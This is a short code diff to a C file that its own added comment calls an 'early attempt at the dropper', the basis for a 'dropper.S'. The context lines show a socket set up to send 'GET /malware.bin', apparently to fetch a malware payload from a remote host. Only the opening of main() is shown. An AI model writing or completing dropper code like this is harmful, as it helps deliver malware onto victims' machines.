@@ -5,6 +5,10 @@
 #include <string.h>
 #include <unistd.h>
 
+/*
+Early attempt at the dropper, dropper.S was written based of off this
+*/
+
 int main(void) {
     int sockfd, b;
     char *send_data = "GET /malware.bin HTTP/1.1\r\n\r\n";
